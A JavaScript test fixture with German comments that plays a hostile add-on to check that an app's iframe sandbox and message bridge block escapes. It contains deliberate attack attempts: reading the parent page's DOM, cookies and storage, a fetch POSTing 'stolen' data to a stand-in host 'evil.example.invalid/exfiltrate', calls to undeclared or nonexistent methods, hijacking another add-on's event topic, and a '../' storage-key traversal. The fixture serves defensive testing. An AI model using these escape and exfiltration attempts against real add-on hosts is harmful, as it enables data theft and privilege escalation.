/*
 * EVIL-FIXTURE, UI-Haelfte (E09-T6, Wargame W-10). TEST-FIXTURE, KEIN Beispiel.
 *
 * Dieses Add-on benutzt ABSICHTLICH das SDK NICHT und schreibt das rohe
 * postMessage-Wire-Protokoll von Hand. Genau das ist der Punkt: die
 * Durchsetzung liegt im HOST (`apps/web/src/addons/bridge.ts`), nicht im
 * (fuer jedes Add-on austauschbaren) SDK. Ein Fixture, das brav das SDK
 * benutzt, koennte diese Aussage nicht beweisen.
 *
 * Deklarierte Scopes (yapaja-addon.json): pos.read, storage.own,
 * widget.register, events.publish.
 * NICHT deklariert -- und daher hier absichtlich versucht:
 *   map.layer.write, route.propose, nav.read, nav.control.
 *
 * Jedes Ergebnis landet im EIGENEN DOM (siehe index.html) -- nie ueber die
 * Bridge zurueck. Zusaetzlich meldet das Fixture die zwei rein browserseitig
 * beobachtbaren Verstoesse (Parent-DOM-Zugriff, Fetch zu fremdem Host)
 * freiwillig per `security-violation`-Nachricht an den Host, damit sie im
 * `security`-Eventlog des Cores auftauchen. Diese Selbstmeldung ist reine
 * AUDITIERBARKEIT: der Block passiert mit oder ohne sie (Opaque Origin + CSP).
 */
(function () {
  var NS = 'yapaja-addon';
  var V = 1;
  var seq = 0;
  var pending = {};

  function set(testid, value) {
    var el = document.querySelector('[data-testid="' + testid + '"]');
    if (el) el.textContent = String(value);
  }

  function post(msg) {
    var envelope = { ns: NS, v: V };
    for (var k in msg) envelope[k] = msg[k];
    // Roher postMessage -- bewusst KEIN SDK (siehe Kopfkommentar).
    window.parent.postMessage(envelope, '*');
  }

  /** Ruft eine Bridge-Methode auf und liefert ein Promise auf das Result. */
  function call(method, params) {
    var callId = 'c' + ++seq;
    return new Promise(function (resolve) {
      pending[callId] = resolve;
      post({ type: 'call', callId: callId, method: method, params: params });
      // Falls der Host gar nicht antwortet, gilt der Versuch als abgelehnt.
      setTimeout(function () {
        if (pending[callId]) {
          delete pending[callId];
          resolve({ ok: false, error: { code: 'NO_RESPONSE', message: 'host did not answer' } });
        }
      }, 4000);
    });
  }

  /** Freiwillige Selbstmeldung eines browserseitig geblockten Versuchs. */
  function reportViolation(vector, detail) {
    post({ type: 'security-violation', vector: vector, detail: detail });
  }

  // -------------------------------------------------------------------------
  // Vektor 1-4: Parent-DOM / top.location / Host-Cookies / Host-localStorage
  // Erwartung: JEDER Zugriff wirft (opaque Origin, sandbox="allow-scripts"
  // OHNE allow-same-origin).
  // -------------------------------------------------------------------------
  function tryParentDomEscape() {
    var readable = false;
    try {
      readable = !!window.parent.document;
    } catch (e) {
      readable = false;
    }
    set('evil-parent-dom-readable', readable);

    var topLocationReadable = false;
    try {
      // `top.location.href` lesen ist cross-origin verboten.
      topLocationReadable = typeof window.top.location.href === 'string';
    } catch (e) {
      topLocationReadable = false;
    }
    set('evil-top-location-readable', topLocationReadable);

    var cookieReadable = false;
    try {
      // In einer opaken Origin wirft schon der Zugriff auf document.cookie.
      // Selbst wo er nicht wirft, ist er NIE der Cookie-Jar des Hosts.
      var c = document.cookie;
      cookieReadable = typeof c === 'string' && c.length > 0;
    } catch (e) {
      cookieReadable = false;
    }
    set('evil-host-cookie-readable', cookieReadable);

    var lsReadable = false;
    try {
      window.localStorage.setItem('evil', '1');
      lsReadable = window.localStorage.getItem('evil') === '1';
    } catch (e) {
      lsReadable = false;
    }
    set('evil-host-localstorage-readable', lsReadable);

    reportViolation(
      'ui.parent_dom_access',
      'versuchte window.parent.document / top.location / document.cookie / localStorage des Hosts zu lesen',
    );
  }

  // -------------------------------------------------------------------------
  // Vektor 5: fetch() zu einem fremden Host aus dem iframe.
  // Erwartung: die Add-on-CSP (`connect-src 'none'`, apps/core/src/addons/
  // ui-host.ts) blockt jeden Netzwerkzugriff -- auch same-origin.
  // -------------------------------------------------------------------------
  function tryForeignFetch() {
    var done = false;
    function finish(ok) {
      if (done) return;
      done = true;
      set('evil-foreign-fetch-ok', ok);
      reportViolation('ui.foreign_host_fetch', 'versuchte fetch() zu einem nicht deklarierten fremden Host');
    }
    try {
      fetch('http://evil.example.invalid/exfiltrate', { method: 'POST', body: 'stolen' })
        .then(function () {
          finish(true);
        })
        .catch(function () {
          finish(false);
        });
    } catch (e) {
      finish(false);
    }
    setTimeout(function () {
      finish(false);
    }, 4000);
  }

  // -------------------------------------------------------------------------
  // Vektoren 6-10: Bridge-Missbrauch. ALLE ueber rohes postMessage.
  // -------------------------------------------------------------------------
  function tryBridgeAbuse() {
    return Promise.all([
      // 6: Methode, deren Scope NICHT deklariert ist (map.layer.write).
      call('map.addLayer', {
        id: 'evil-layer',
        data: { type: 'FeatureCollection', features: [] },
      }).then(function (res) {
        set('evil-undeclared-scope-ok', res.ok === true);
      }),

      // 7: Methode, die es ueberhaupt nicht gibt.
      call('core.executeSql', { sql: 'SELECT * FROM settings' }).then(function (res) {
        set('evil-unknown-method-ok', res.ok === true);
      }),

      // 8: Route AKTIVIEREN (nicht vorschlagen) ohne Nutzerbestaetigung.
      //    Es gibt keine solche Bridge-Methode -- genau das ist die Aussage:
      //    der Host bietet Add-ons NUR `route.propose` an (und auch das nur
      //    mit Scope, und auch das rendert nur ein Banner).
      call('route.activate', { waypoints: [{ lat: 47.4, lng: 9.7 }] }).then(function (res) {
        set('evil-route-activate-ok', res.ok === true);
      }),

      // 9: Event-Topic im Namensraum eines ANDEREN Add-ons.
      //    Scope events.publish IST deklariert -- der Namensraum ist die
      //    Grenze, nicht der Scope.
      //    (Ein Core-Topic wie `nav/state` wird vom Host NICHT abgelehnt,
      //    sondern in `addon/{id}/nav/state` UMGESCHRIEBEN -- eine staerkere
      //    Garantie als eine Ablehnung. Dass dabei wirklich nichts auf dem
      //    echten `nav/state` landet, weist die Core-Haelfte der Suite
      //    direkt auf dem Bus nach, siehe core-vectors.spec.ts.)
      call('events.publish', {
        topic: 'addon/com.example.victim/started',
        payload: { hijacked: true },
      }).then(function (res) {
        set('evil-foreign-topic-ok', res.ok === true);
      }),

      // 10: Storage-Key ausserhalb des eigenen Namensraums (Traversal).
      call('storage.set', { key: '../com.yapaja.track-recorder/index', value: 'pwned' }).then(function (res) {
        set('evil-storage-escape-ok', res.ok === true);
      }),
    ]);
  }

  window.addEventListener('message', function (event) {
    var data = event.data;
    if (!data || data.ns !== NS || typeof data.type !== 'string') return;

    if (data.type === 'result') {
      var resolve = pending[data.callId];
      if (resolve) {
        delete pending[data.callId];
        resolve(data);
      }
      return;
    }

    if (data.type === 'init') {
      // Ein legitimer Aufruf (deklarierter Scope), damit der Test
      // "das Add-on laeuft ueberhaupt" von "alles ist geblockt" unterscheiden
      // kann -- sonst waere ein kaputtes Fixture nicht von einer perfekten
      // Sandbox zu unterscheiden.
      call('widgets.register', {
        widgetId: 'evil-status',
        name: 'Evil Fixture Status',
        slots: ['map-overlay-tr'],
        data: { text: 'armed' },
      });

      tryParentDomEscape();
      tryForeignFetch();
      tryBridgeAbuse().then(function () {
        set('evil-done', true);
      });
    }
  });

  post({ type: 'ready' });
})();
